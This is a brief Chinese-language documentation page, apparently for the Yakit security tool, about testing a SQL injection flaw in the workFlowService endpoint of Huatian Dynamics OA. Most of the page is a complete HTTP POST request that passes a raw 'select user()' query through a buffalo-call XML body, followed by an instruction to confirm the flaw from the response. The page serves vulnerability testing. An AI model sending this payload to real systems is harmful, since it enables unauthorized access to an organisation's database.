---
sidebar_position: 22
---
# 华天动力OA插件使用

## 1 workFlowService SQL注入漏洞

**插件id：**

Yakit正在努力编写~

**测试过程：**

测试网站构造恶意请求包发送

```go
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0

<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>
```

查看响应包，确认漏洞

![](/img/products/yakit/HTDLOA-1.png)